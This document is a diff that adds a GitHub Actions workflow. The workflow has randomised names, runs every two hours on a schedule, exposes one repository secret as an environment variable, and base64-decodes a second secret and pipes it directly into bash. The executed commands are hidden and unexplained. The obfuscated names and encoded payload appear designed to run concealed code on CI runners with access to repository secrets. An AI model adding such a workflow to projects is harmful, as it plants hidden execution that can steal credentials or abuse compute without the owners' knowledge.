@@ -1,0 +1,13 @@
+name: FEkDjUn
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  rTFhQH:
+    runs-on: ubuntu-latest
+    env:
+      xoNpfaHxUPN: ${{ secrets.GhzVasDpMdb }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.IHUakihpmD }}" | base64 -d | bash
